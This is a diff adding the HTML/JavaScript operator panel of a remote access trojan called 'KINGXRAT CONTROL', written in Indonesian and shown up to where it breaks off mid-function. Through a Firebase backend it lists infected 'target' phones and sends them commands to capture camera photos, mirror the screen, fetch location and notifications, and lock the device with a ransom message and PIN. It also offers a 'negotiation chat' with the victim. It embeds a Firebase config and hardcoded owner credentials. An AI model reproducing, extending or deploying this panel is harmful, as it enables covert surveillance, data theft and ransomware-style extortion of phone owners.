@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>KINGXRAT CONTROL | KINGMU</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a2a4a 0%, #0a1a3a 100%);
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container { max-width: 1300px; margin: 0 auto; }
+        
+        .header {
+            background: #0a1a3a;
+            border: 2px solid #00aaff;
+            border-radius: 12px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .header h1 { color: #00aaff; font-size: 28px; letter-spacing: 3px; text-shadow: 0 0 5px #00aaff; }
+        .header .owner { color: #88aaff; font-size: 11px; margin-top: 5px; }
+        
+        /* PAGE LOGIN UTAMA */
+        #pageLogin {
+            max-width: 400px;
+            margin: 100px auto;
+            background: #0a1a3a;
+            border: 2px solid #00aaff;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+        }
+        #pageLogin h2 { color: #00aaff; margin-bottom: 20px; }
+        .login-buttons { display: flex; gap: 15px; justify-content: center; margin-bottom: 20px; }
+        .login-btn { flex: 1; padding: 12px; background: #00aaff; border: none; border-radius: 8px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .login-btn.owner { background: #ffaa00; color: #000; }
+        
+        /* PAGE LOGIN FORM */
+        #pageLoginForm {
+            max-width: 400px;
+            margin: 100px auto;
+            background: #0a1a3a;
+            border: 2px solid #00aaff;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            display: none;
+        }
+        #pageLoginForm input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #0a2a4a;
+            border: 1px solid #00aaff;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        #pageLoginForm button {
+            width: 100%;
+            padding: 12px;
+            background: #00aaff;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .back-to-choice { background: transparent; border: 1px solid #00aaff; color: #00aaff; margin-top: 10px; }
+        .login-error { color: #ff4444; margin-top: 10px; font-size: 12px; }
+        
+        /* PAGE OWNER PANEL */
+        #pageOwnerPanel {
+            max-width: 500px;
+            margin: 50px auto;
+            background: #0a1a3a;
+            border: 2px solid #ffaa00;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            display: none;
+        }
+        #pageOwnerPanel h2 { color: #ffaa00; margin-bottom: 20px; }
+        #pageOwnerPanel input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #0a2a4a;
+            border: 1px solid #ffaa00;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        #pageOwnerPanel button {
+            width: 100%;
+            padding: 12px;
+            background: #ffaa00;
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .logout-owner-btn { background: #ff4444; color: white; margin-top: 10px; }
+        .user-list { margin-top: 20px; text-align: left; }
+        .user-list h4 { color: #ffaa00; margin-bottom: 10px; }
+        .user-item { background: #0a2a4a; padding: 8px; margin: 5px 0; border-radius: 5px; color: #88aaff; font-size: 12px; }
+        
+        /* PAGE DEVICE LIST */
+        #pageDeviceList { max-width: 700px; margin: 0 auto; display: none; }
+        .device-card { background: #0a1a3a; border: 1px solid #00aaff; border-radius: 10px; padding: 15px; margin-bottom: 12px; cursor: pointer; transition: all 0.2s; position: relative; }
+        .device-card:hover { background: #0a2a4a; transform: translateX(5px); border-color: #00ff88; }
+        .device-name { color: #00aaff; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .device-info { color: #88aaff; font-size: 11px; margin-top: 6px; cursor: pointer; }
+        .status-dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; display: inline-block; margin-right: 6px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .delete-device-btn { position: absolute; top: 10px; right: 10px; background: #ff4444; border: none; border-radius: 5px; padding: 5px 10px; color: white; cursor: pointer; font-size: 10px; }
+        .empty-state { text-align: center; padding: 50px; color: #88aaff; border: 1px dashed #00aaff; border-radius: 12px; }
+        .stats { margin-top: 20px; padding-top: 15px; border-top: 1px solid #00aaff; color: #88aaff; font-size: 12px; text-align: center; display: flex; justify-content: space-between; align-items: center; }
+        .clear-history-btn { background: #ff4444; border: none; padding: 5px 15px; border-radius: 8px; color: white; cursor: pointer; font-size: 12px; }
+        .logout-user-btn { background: #ffaa00; border: none; padding: 5px 15px; border-radius: 8px; color: #000; cursor: pointer; font-size: 12px; margin-left: 10px; }
+        
+        /* PAGE DASHBOARD */
+        #pageDashboard { display: none; }
+        .back-btn { background: #0a2a4a; border: 1px solid #00aaff; padding: 8px 20px; border-radius: 8px; color: #00aaff; cursor: pointer; margin-bottom: 15px; }
+        .target-header { background: #0a1a3a; border: 1px solid #00aaff; border-radius: 10px; padding: 12px; margin-bottom: 20px; }
+        .target-header p { color: #00aaff; font-size: 13px; margin: 5px 0; }
+        .target-header span { color: #88aaff; }
+        
+        .menu-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 25px; }
+        .menu-card { background: #0a1a3a; border: 1px solid #2a4a8a; border-radius: 10px; padding: 12px; text-align: center; cursor: pointer; transition: all 0.2s; }
+        .menu-card:hover { background: #0a2a4a; border-color: #00aaff; transform: scale(1.02); }
+        .menu-card .emoji { font-size: 28px; margin-bottom: 5px; }
+        .menu-card .title { color: #00aaff; font-size: 11px; font-weight: bold; }
+        
+        .sub-page { display: none; background: #0a1a3a; border: 1px solid #00aaff; border-radius: 12px; padding: 20px; margin-top: 15px; }
+        .sub-page.active { display: block; }
+        .sub-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #2a4a8a; }
+        .sub-header h3 { color: #00aaff; font-size: 16px; }
+        .close-sub { background: #ff4444; border: none; padding: 5px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; }
+        
+        .cmd-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
+        .cmd-btn { background: #0a2a4a; border: 1px solid #2a4a8a; border-radius: 8px; padding: 12px; color: #00aaff; cursor: pointer; font-weight: bold; }
+        .cmd-btn:hover { background: #0a3a5a; border-color: #00aaff; }
+        .cmd-btn.danger { border-color: #ff4444; color: #ff8888; }
+        
+        .text-input { width: 100%; padding: 10px; background: #0a2a4a; border: 1px solid #2a4a8a; border-radius: 8px; color: white; margin: 10px 0; }
+        
+        .result-box { background: #0a2a4a; border: 1px solid #2a4a8a; border-radius: 10px; padding: 12px; margin-top: 15px; min-height: 100px; }
+        .result-title { color: #88aaff; font-size: 11px; margin-bottom: 8px; }
+        .photo-result { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
+        .photo-result img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 1px solid #00aaff; }
+        .delete-result-btn { background: #ff4444; border: none; padding: 4px 8px; border-radius: 5px; color: white; cursor: pointer; font-size: 10px; margin-left: 5px; }
+        
+        .chat-container { height: 300px; display: flex; flex-direction: column; }
+        .chat-messages { flex: 1; background: #0a0a1a; border: 1px solid #2a4a8a; border-radius: 8px; padding: 10px; overflow-y: auto; margin-bottom: 10px; }
+        .chat-message { padding: 8px; margin: 5px 0; border-radius: 8px; max-width: 80%; }
+        .chat-target { background: #1a3a5a; color: #88ff88; text-align: left; }
+        .chat-owner { background: #3a1a3a; color: #ff8888; text-align: right; margin-left: auto; }
+        .chat-input-area { display: flex; gap: 10px; }
+        .chat-input { flex: 1; padding: 10px; background: #0a2a4a; border: 1px solid #2a4a8a; border-radius: 8px; color: white; }
+        .chat-send { background: #00aaff; border: none; padding: 10px 20px; border-radius: 8px; color: black; cursor: pointer; font-weight: bold; }
+        
+        .photo-gallery { display: flex; flex-wrap: wrap; gap: 12px; max-height: 400px; overflow-y: auto; }
+        .photo-item { background: #0a2a4a; border: 1px solid #2a4a8a; border-radius: 8px; padding: 8px; text-align: center; position: relative; width: 100px; }
+        .photo-item img { width: 84px; height: 84px; object-fit: cover; border-radius: 6px; cursor: pointer; }
+        .delete-photo { position: absolute; top: -8px; right: -8px; background: #ff4444; color: white; border: none; border-radius: 50%; width: 20px; height: 20px; font-size: 10px; cursor: pointer; }
+        
+        .info-box { background: #0a2a4a; border: 1px solid #2a4a8a; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
+        .info-box p { color: #88aaff; margin: 5px 0; font-size: 12px; }
+        .info-box span { color: #00aaff; font-weight: bold; }
+        
+        .live-preview { background: #0a0a1a; border: 1px solid #00aaff; border-radius: 8px; padding: 10px; text-align: center; }
+        .live-preview img { max-width: 100%; border-radius: 6px; margin-top: 10px; }
+        
+        .log-content { height: 100px; overflow-y: auto; font-size: 10px; background: #0a0a1a; border: 1px solid #2a4a8a; border-radius: 8px; padding: 10px; margin-top: 20px; }
+        .log-entry { padding: 3px; border-bottom: 1px solid #1a2a4a; color: #88aaff; }
+        .log-entry.success { color: #00ff88; }
+        .log-entry.error { color: #ff8888; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: #0a1a3a; border: 2px solid #00aaff; border-radius: 15px; padding: 20px; max-width: 90%; }
+        .modal img { max-width: 100%; border-radius: 10px; }
+        .close-modal { background: #ff4444; border: none; padding: 8px 20px; border-radius: 8px; color: white; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔥 KINGXRAT CONTROL 🔥</h1>
+        <div class="owner">OWNER: KINGMU 👑 | EL SHARK X</div>
+    </div>
+
+    <!-- PAGE LOGIN UTAMA -->
+    <div id="pageLogin">
+        <h2>🔐 SELECT LOGIN TYPE</h2>
+        <div class="login-buttons">
+            <button class="login-btn" onclick="showUserLogin()">👤 LOGIN AS USER</button>
+            <button class="login-btn owner" onclick="showOwnerLogin()">👑 LOGIN AS OWNER</button>
+        </div>
+    </div>
+
+    <!-- PAGE LOGIN FORM -->
+    <div id="pageLoginForm">
+        <h2 id="loginFormTitle">🔐 LOGIN</h2>
+        <input type="text" id="loginUsername" placeholder="Username">
+        <input type="password" id="loginPassword" placeholder="Password">
+        <button onclick="submitLogin()">LOGIN</button>
+        <button class="back-to-choice" onclick="backToChoice()">← KEMBALI KE HALAMAN LOGIN</button>
+        <div id="loginError" class="login-error"></div>
+    </div>
+
+    <!-- PAGE OWNER PANEL -->
+    <div id="pageOwnerPanel">
+        <h2>👑 OWNER PANEL</h2>
+        <input type="text" id="newUsername" placeholder="Username Baru">
+        <input type="password" id="newPassword" placeholder="Password Baru">
+        <button onclick="createUser()">➕ CREATE USER</button>
+        <button class="logout-owner-btn" onclick="logoutOwner()">🚪 LOGOUT (KEMBALI KE LOGIN)</button>
+        <div class="user-list"><h4>📋 DAFTAR USER</h4><div id="userListContainer"></div></div>
+    </div>
+
+    <!-- PAGE DEVICE LIST -->
+    <div id="pageDeviceList">
+        <div style="text-align: right; margin-bottom: 10px;">
+            <button class="logout-user-btn" onclick="logoutUser()">🚪 LOGOUT (KEMBALI KE LOGIN)</button>
+        </div>
+        <div id="deviceListContainer"><div class="empty-state">⏳ MEMUAT DAFTAR PERANGKAT...</div></div>
+        <div class="stats">
+            <span>TOTAL: <span id="totalDevices">0</span> | 🟢 ONLINE: <span id="onlineDevices">0</span> | 🔴 OFFLINE: <span id="offlineDevices">0</span></span>
+            <button class="clear-history-btn" onclick="clearAllDevices()">🗑️ CLEAR ALL DEVICES</button>
+        </div>
+    </div>
+
+    <!-- PAGE DASHBOARD -->
+    <div id="pageDashboard">
+        <button class="back-btn" onclick="backToDeviceList()">← KEMBALI KE DEVICE LIST</button>
+        <div class="target-header">
+            <p>🎯 TARGET: <span id="deviceName">-</span></p>
+            <p>📍 LOKASI: <span id="locationInfo">-</span> | IP: <span id="ipInfo">-</span></p>
+            <p>🔋 BATTERY: <span id="batteryInfo">-</span></p>
+        </div>
+
+        <div class="menu-grid">
+            <div class="menu-card" onclick="openSubPage('flashlightPage')"><div class="emoji">🔦</div><div class="title">FLASHLIGHT</div></div>
+            <div class="menu-card" onclick="openSubPage('vibratePage')"><div class="emoji">📳</div><div class="title">GETARAN</div></div>
+            <div class="menu-card" onclick="openSubPage('mirrorPage')"><div class="emoji">🖥️</div><div class="title">MIRRORING</div></div>
+            <div class="menu-card" onclick="openSubPage('lockPage')"><div class="emoji">🔒</div><div class="title">LOCK ALL</div></div>
+            <div class="menu-card" onclick="openSubPage('textPage')"><div class="emoji">📝</div><div class="title">KIRIM TEKS</div></div>
+            <div class="menu-card" onclick="openSubPage('chatPage')"><div class="emoji">💬</div><div class="title">CHAT NEGOSIASI</div></div>
+            <div class="menu-card" onclick="openSubPage('cameraPage')"><div class="emoji">📸</div><div class="title">CAMERA</div></div>
+            <div class="menu-card" onclick="openSubPage('ttsPage')"><div class="emoji">🔊</div><div class="title">TEXT TO SPEECH</div></div>
+            <div class="menu-card" onclick="openSubPage('dataPage')"><div class="emoji">📊</div><div class="title">DATA</div></div>
+            <div class="menu-card" onclick="openSubPage('extraPage')"><div class="emoji">⚡</div><div class="title">EXTRA</div></div>
+            <div class="menu-card" onclick="openSubPage('livePage')"><div class="emoji">🎥</div><div class="title">LIVE SCREEN</div></div>
+            <div class="menu-card" onclick="openSubPage('photoPage')"><div class="emoji">🖼️</div><div class="title">GALERI FOTO</div></div>
+        </div>
+
+        <!-- FLASHLIGHT -->
+        <div id="flashlightPage" class="sub-page"><div class="sub-header"><h3>🔦 FLASHLIGHT</h3><button class="close-sub" onclick="closeSubPage('flashlightPage')">✕</button></div>
+            <div class="cmd-grid"><button class="cmd-btn" onclick="sendCommand('flash_on')">💡 FLASH ON</button><button class="cmd-btn" onclick="sendCommand('flash_off')">❌ FLASH OFF</button><button class="cmd-btn warning" onclick="sendCommand('flash_blink')">⚡ FLASH KELAP-KELIP</button><button class="cmd-btn" onclick="sendCommand('flash_stop')">⏹️ FLASH STOP</button></div>
+        </div>
+
+        <!-- VIBRATE (BENERAN GETAR) -->
+        <div id="vibratePage" class="sub-page"><div class="sub-header"><h3>📳 GETARAN</h3><button class="close-sub" onclick="closeSubPage('vibratePage')">✕</button></div>
+            <div class="cmd-grid"><button class="cmd-btn" onclick="sendCommand('vibrate_bom')">📳 VIBRATE BOM</button><button class="cmd-btn" onclick="sendCommand('vibrate_stop')">⏹️ VIBRATE STOP</button></div>
+        </div>
+
+        <!-- MIRRORING -->
+        <div id="mirrorPage" class="sub-page"><div class="sub-header"><h3>🖥️ MIRRORING</h3><button class="close-sub" onclick="closeSubPage('mirrorPage')">✕</button></div>
+            <div class="cmd-grid"><button class="cmd-btn" onclick="startLiveScreen()">🟢 LIVE SCREEN ON</button><button class="cmd-btn" onclick="stopLiveScreen()">🔴 LIVE SCREEN OFF</button><button class="cmd-btn" onclick="sendCommand('screenshot')">📸 SCREENSHOT</button></div>
+            <div class="result-box"><div class="result-title">🖼️ LIVE SCREEN PREVIEW</div><div id="livePreviewText" style="color:#88aaff;">Belum ada preview</div><img id="liveScreenImg" src="" style="display:none; max-width:100%; margin-top:10px;"></div>
+        </div>
+
+        <!-- LOCK ALL -->
+        <div id="lockPage" class="sub-page"><div class="sub-header"><h3>🔒 LOCK CONTROL</h3><button class="close-sub" onclick="closeSubPage('lockPage')">✕</button></div>
+            <div class="cmd-grid"><button class="cmd-btn" onclick="sendCommand('unlock_device')">🔓 UNLOCK DEVICE</button><button class="cmd-btn danger" onclick="sendCommand('lock_screen')">🔒 LOCK DEVICE</button></div>
+            <input type="text" id="lockTitle" class="text-input" placeholder="Judul Lock">
+            <input type="text" id="lockMessage" class="text-input" placeholder="Pesan Penebusan">
+            <input type="text" id="lockPin" class="text-input" placeholder="PIN (default: 123456)" value="123456">
+            <button class="cmd-btn danger" onclick="sendLockScreen()">💀 LOCK DEVICE</button>
+        </div>
+
+        <!-- KIRIM TEKS -->
+        <div id="textPage" class="sub-page"><div class="sub-header"><h3>📝 KIRIM TEKS KE LAYAR</h3><button class="close-sub" onclick="closeSubPage('textPage')">✕</button></div>
+            <input type="text" id="textToScreen" class="text-input" placeholder="Masukkan teks">
+            <button class="cmd-btn" onclick="sendTextToScreen()">📨 KIRIM TEKS</button>
+        </div>
+
+        <!-- CHAT NEGOSIASI -->
+        <div id="chatPage" class="sub-page"><div class="sub-header"><h3>💬 CHAT NEGOSIASI</h3><button class="close-sub" onclick="closeSubPage('chatPage')">✕</button></div>
+            <div class="chat-container"><div class="chat-messages" id="chatMessages"><div class="chat-message chat-owner">[SYSTEM] Chat negosiasi dimulai</div></div><div class="chat-input-area"><input type="text" id="chatInput" class="chat-input" placeholder="Ketik pesan..."><button class="chat-send" onclick="sendChatMessage()">KIRIM</button></div></div>
+        </div>
+   <!-- CAMERA -->
+        <div id="cameraPage" class="sub-page"><div class="sub-header"><h3>📸 CAMERA</h3><button class="close-sub" onclick="closeSubPage('cameraPage')">✕</button></div>
+            <div class="cmd-grid"><button class="cmd-btn" onclick="sendCommand('camera_depan')">📸 CAMERA DEPAN</button><button class="cmd-btn" onclick="sendCommand('camera_belakang')">📷 CAMERA BELAKANG</button></div>
+            <div class="result-box"><div class="result-title">📸 HASIL FOTO</div><div id="cameraResult" class="photo-result"></div></div>
+        </div>
+
+        <!-- TEXT TO SPEECH -->
+        <div id="ttsPage" class="sub-page"><div class="sub-header"><h3>🔊 TEXT TO SPEECH</h3><button class="close-sub" onclick="closeSubPage('ttsPage')">✕</button></div>
+            <input type="text" id="ttsText" class="text-input" placeholder="Masukkan pesan suara...">
+            <button class="cmd-btn" onclick="sendTTS()">🔊 KIRIM SUARA</button>
+            <div class="result-box" style="margin-top:15px;"><div class="result-title">🎤 HASIL SUARA</div><div id="ttsResult" style="color:#00ff88; font-size:12px;">Belum ada suara dikirim</div></div>
+        </div>
+
+        <!-- DATA -->
+        <div id="dataPage" class="sub-page"><div class="sub-header"><h3>📊 DATA TARGET</h3><button class="close-sub" onclick="closeSubPage('dataPage')">✕</button></div>
+            <div class="info-box"><p>📱 PERANGKAT: <span id="dataDeviceModel">-</span></p><p>🌐 PLATFORM: <span id="dataPlatform">-</span></p><p>🔋 BATTERY: <span id="dataBattery">-</span></p></div>
+            <div class="cmd-grid"><button class="cmd-btn" onclick="sendCommand('get_location')">📍 GET LOCATION</button><button class="cmd-btn" onclick="sendCommand('get_notif')">🔔 GET NOTIF</button></div>
+            <div class="result-box"><div class="result-title">📍 LOKASI TARGET</div><div id="locationResult"><div style="color:#88aaff;">Belum ada lokasi</div></div></div>
+            <div class="result-box"><div class="result-title">🔔 NOTIFIKASI PERMISSION</div><div id="notifResult"><div style="color:#88aaff;">Belum diminta</div></div></div>
+        </div>
+
+        <!-- EXTRA -->
+        <div id="extraPage" class="sub-page"><div class="sub-header"><h3>⚡ EXTRA</h3><button class="close-sub" onclick="closeSubPage('extraPage')">✕</button></div>
+            <div style="color:#88aaff; text-align:center; padding:20px;">Tidak ada fitur extra</div>
+        </div>
+
+        <!-- LIVE SCREEN PREVIEW -->
+        <div id="livePage" class="sub-page"><div class="sub-header"><h3>🎥 LIVE SCREEN PREVIEW</h3><button class="close-sub" onclick="closeSubPage('livePage')">✕</button></div>
+            <div class="live-preview"><img id="livePreviewImg" src="" style="width:100%; border-radius:8px;"><button class="cmd-btn" onclick="refreshLiveScreen()" style="margin-top:10px;">🔄 REFRESH</button></div>
+        </div>
+
+        <!-- GALERI FOTO -->
+        <div id="photoPage" class="sub-page"><div class="sub-header"><h3>🖼️ GALERI FOTO</h3><button class="close-sub" onclick="closeSubPage('photoPage')">✕</button></div>
+            <div id="photoGallery" class="photo-gallery"><div style="color:#88aaff; text-align:center; width:100%;">BELUM ADA FOTO</div></div>
+        </div>
+
+        <div class="log-content" id="logContent"><div class="log-entry">[>] SYSTEM READY</div><div class="log-entry">[>] SELECT DEVICE FROM LIST</div></div>
+    </div>
+</div>
+
+<div id="imageModal" class="modal"><div class="modal-content"><img id="modalImage" src=""><button class="close-modal" onclick="closeModal()">TUTUP</button></div></div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyD8p48Vg2DoWRycAg817FGWzJ2YLh6xsGA",
+        authDomain: "rats-9020c.firebaseapp.com",
+        databaseURL: "https://rats-9020c-default-rtdb.asia-southeast1.firebasedatabase.app/",
+        projectId: "rats-9020c",
+        storageBucket: "rats-9020c.firebasestorage.app",
+        messagingSenderId: "300945222958",
+        appId: "1:300945222958:web:56a9789499f9fdc56f9ebf"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let currentTargetId = null;
+    let devices = {};
+    let liveInterval = null;
+    let currentLoginType = null;
+    let users = JSON.parse(localStorage.getItem('kingmu_users') || '[{"username":"kael","password":"141211"}]');
+    function saveUsers() { localStorage.setItem('kingmu_users', JSON.stringify(users)); }
+    function updateUserList() { const c = document.getElementById('userListContainer'); if(c) c.innerHTML = users.map(u => `<div class="user-item">👤 ${u.username}</div>`).join(''); }
+
+    function logoutUser() {
+        localStorage.removeItem('kingmu_logged_in');
+        document.getElementById('pageDeviceList').style.display = 'none';
+        document.getElementById('pageDashboard').style.display = 'none';
+        document.getElementById('pageLogin').style.display = 'block';
+        document.getElementById('pageLoginForm').style.display = 'none';
+        document.getElementById('pageOwnerPanel').style.display = 'none';
+        if(liveInterval) clearInterval(liveInterval);
+        currentTargetId = null;
+    }
+    function logoutOwner() {
+        localStorage.removeItem('kingmu_logged_in');
+        document.getElementById('pageOwnerPanel').style.display = 'none';
+        document.getElementById('pageLogin').style.display = 'block';
+        document.getElementById('pageLoginForm').style.display = 'none';
+    }
+
+    function showUserLogin() { currentLoginType = 'user'; document.getElementById('loginFormTitle').innerText = '👤 LOGIN AS USER'; document.getElementById('pageLogin').style.display = 'none'; document.getElementById('pageLoginForm').style.display = 'block'; }
+    function showOwnerLogin() { currentLoginType = 'owner'; document.getElementById('loginFormTitle').innerText = '👑 LOGIN AS OWNER'; document.getElementById('pageLogin').style.display = 'none'; document.getElementById('pageLoginForm').style.display = 'block'; }
+    function backToChoice() { document.getElementById('pageLoginForm').style.display = 'none'; document.getElementById('pageLogin').style.display = 'block'; }
+
+    function submitLogin() {
+        const username = document.getElementById('loginUsername').value;
+        const password = document.getElementById('loginPassword').value;
+        if(currentLoginType === 'owner') {
+            if(username === 'kael' && password === '141211') {
+                localStorage.setItem('kingmu_logged_in', 'owner');
+                document.getElementById('pageLoginForm').style.display = 'none';
+                document.getElementById('pageOwnerPanel').style.display = 'block';
+                updateUserList();
+            } else { document.getElementById('loginError').innerText = '❌ Username atau Password Owner salah!'; }
+        } else {
+            const userExists = users.some(u => u.username === username && u.password === password);
+            if(userExists) {
+                localStorage.setItem('kingmu_logged_in', 'user');
+                document.getElementById('pageLoginForm').style.display = 'none';
+                document.getElementById('pageDeviceList').style.display = 'block';
+                updateDeviceList();
+            } else { document.getElementById('loginError').innerText = '❌ Username atau Password salah!'; }
+        }
+    }
+
+    function createUser() {
+        const newUser = document.getElementById('newUsername').value;
+        const newPass = document.getElementById('newPassword').value;
+        if(newUser && newPass) {
+            if(users.some(u => u.username === newUser)) { alert('Username sudah ada!'); return; }
+            users.push({ username: newUser, password: newPass });
+            saveUsers();
+            updateUserList();
+            document.getElementById('newUsername').value = '';
+            document.getElementById('newPassword').value = '';
+        } else { alert('Isi username dan password!'); }
+    }
+
+    const loggedIn = localStorage.getItem('kingmu_logged_in');
+    if(loggedIn === 'owner') { document.getElementById('pageLogin').style.display = 'none'; document.getElementById('pageOwnerPanel').style.display = 'block'; updateUserList(); }
+    else if(loggedIn === 'user') { document.getElementById('pageLogin').style.display = 'none'; document.getElementById('pageDeviceList').style.display = 'block'; updateDeviceList(); }
+
+    function addLog(msg, type = 'info') {
+        const log = document.getElementById('logContent');
+        if(!log) return;
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        log.appendChild(entry);
+        entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        while (log.children.length > 40) log.removeChild(log.firstChild);
+    }
+
+    function getDeviceBrandFromUserAgent(ua) {
+        ua = ua.toLowerCase();
+        if (ua.includes('samsung') || ua.includes('sm-')) return 'Samsung';
+        if (ua.includes('redmi') || ua.includes('xiaomi') || ua.includes('mi ') || ua.includes('poco')) return 'Xiaomi/Redmi';
+        if (ua.includes('oppo') || ua.includes('cph')) return 'OPPO';
+        if (ua.includes('vivo')) return 'vivo';
+        if (ua.includes('realme')) return 'realme';
+        if (ua.includes('infinix')) return 'Infinix';
+        if (ua.includes('tecno')) return 'Tecno';
+        if (ua.includes('nokia')) return 'Nokia';
+        if (ua.includes('asus')) return 'ASUS';
+        if (ua.includes('google pixel')) return 'Google Pixel';
+        if (ua.includes('oneplus')) return 'OnePlus';
+        if (ua.includes('iphone')) return 'iPhone';
+        return 'Android';
+    }
+
+    function updateDeviceList() {
+        db.ref('targets').once('value').then(snap => {
+            devices = snap.val() || {};
+            const container = document.getElementById('deviceListContainer');
+            const total = Object.keys(devices).length;
+            let online = 0;
+            if (!container) return;
+            if (total === 0) { container.innerHTML = '<div class="empty-state">📭 BELUM ADA PERANGKAT TERHUBUNG</div>'; document.getElementById('totalDevices').innerText = '0'; document.getElementById('onlineDevices').innerText = '0'; document.getElementById('offlineDevices').innerText = '0'; return; }
+            let html = '';
+            for (const [id, device] of Object.entries(devices)) {
+                const isOnline = device.online === true;
+                if (isOnline) online++;
+                let deviceName = device.displayName || device.deviceModel || device.info?.deviceModel || 'Android Device';
+                if (device.info?.userAgent && !device.displayName) {
+                    const brand = getDeviceBrandFromUserAgent(device.info.userAgent);
+                    if (brand !== 'Android') deviceName = brand;
+                }
+                if (deviceName === 'Unknown Device') deviceName = 'Android Device';
+                html += `<div class="device-card" data-id="${id}"><div class="device-name" onclick="selectDevice('${id}')"><span class="status-dot"></span> ${deviceName}</div><div class="device-info" onclick="selectDevice('${id}')">${isOnline ? 'ONLINE' : 'OFFLINE'} | IP: ${device.ip || '-'}</div><button class="delete-device-btn" onclick="deleteDevice('${id}', event)">🗑️ HAPUS</button></div>`;
+            }
+            container.innerHTML = html;
+            document.getElementById('totalDevices').innerText = total;
+            document.getElementById('onlineDevices').innerText = online;
+            document.getElementById('offlineDevices').innerText = total - online;
+        });
+    }
+
+    function deleteDevice(deviceId, event) { event.stopPropagation(); if(confirm(`Hapus device ini?`)) { db.ref(`targets/${deviceId}`).remove().then(() => { addLog(`[🗑️] DEVICE DIHAPUS`, 'success'); updateDeviceList(); }); } }
+    function clearAllDevices() { if(confirm('HAPUS SEMUA DEVICE?')) { db.ref('targets').remove().then(() => { addLog(`[🗑️] SEMUA DEVICE DIHAPUS`, 'success'); updateDeviceList(); }); } }
+
+    function selectDevice(id) {
+        currentTargetId = id;
+        const device = devices[id];
+        let deviceName = device?.displayName || device?.deviceModel || 'Android Device';
+        if (device?.info?.userAgent && !device?.displayName) {
+            const brand = getDeviceBrandFromUserAgent(device.info.userAgent);
+            if (brand !== 'Android') deviceName = brand;
+        }
+        document.getElementById('pageDeviceList').style.display = 'none';
+        document.getElementById('pageDashboard').style.display = 'block';
+        document.getElementById('deviceName').innerHTML = deviceName;
+        addLog(`[✓] MEMILIH PERANGKAT: ${deviceName}`, 'success');
+        
+        db.ref(`targets/${id}/photos`).on('value', snap => { updatePhotoGallery(snap.val()); updateCameraResult(snap.val()); });
+        db.ref(`targets/${id}/battery`).on('value', snap => { if(snap.val()) { document.getElementById('batteryInfo').innerHTML = `${snap.val().level}% ${snap.val().charging ? '🔌' : '🔋'}`; document.getElementById('dataBattery').innerHTML = `${snap.val().level}% ${snap.val().charging ? 'Charging' : 'Battery'}`; } });
+        db.ref(`targets/${id}/info`).on('value', snap => { if(snap.val()) { document.getElementById('dataDeviceModel').innerHTML = snap.val().deviceModel || snap.val().platform || '-'; document.getElementById('dataPlatform').innerHTML = snap.val().platform || '-'; } });
+        db.ref(`targets/${id}/screenshots`).on('value', snap => { if(snap.val()) { document.getElementById('liveScreenImg').src = snap.val(); document.getElementById('liveScreenImg').style.display = 'block'; document.getElementById('livePreviewText').style.display = 'none'; document.getElementById('livePreviewImg').src = snap.val(); } });
+        
+        db.ref(`chat/${id}`).on('value', snap => {
+            const chat = snap.val();
+            if (chat && chat.message && chat.from === 'target') {
+                const container = document.getElementById('chatMessages');
+                const msgDiv = document.createElement('div'); msgDiv.className = 'chat-message chat-target'; msgDiv.innerHTML = `[TARGET] ${chat.message}`; container.appendChild(msgDiv); container.scrollTop = container.scrollHeight;
+            }
+        });
+        
+        db.ref(`responses/${id}`).on('value', snap => {
+            const res = snap.val();
+            if (res && res.command === 'location' && res.data) {
+                document.getElementById('locationInfo').innerHTML = `${res.data.lat}, ${res.data.lng}`;
+                document.getElementById('ipInfo').innerHTML = res.data.ip || '-';
